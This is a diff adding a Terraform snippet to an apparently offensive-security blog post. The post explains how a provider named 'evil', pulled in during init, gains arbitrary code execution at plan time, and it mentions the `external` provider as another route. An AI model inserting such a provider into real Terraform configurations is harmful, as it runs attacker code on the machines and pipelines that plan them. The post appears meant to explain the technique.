@@ -39,6 +39,18 @@ That's it:
 
 Since the provider will be pulled in during the `init` and run some code during the `plan`, you have arbitrary code execution.
 
+```
+terraform {
+  required_providers {
+    evil = {
+      source  = "alxk/evil"
+      version = "1.0"
+    }
+  }
+}
+provider "evil" {}
+```
+
 ## Using the `external` Provider
 
 A much more elegant solution was suggested by my colleague [Chongyang Shi](https://scy.email). Terraform offers the [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) which provides a way to interface between Terraform and external programs. You can use the `external` data source to run arbitrary code that will also be executed during a plan. The following example is given by Terraform in the [docs](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source):
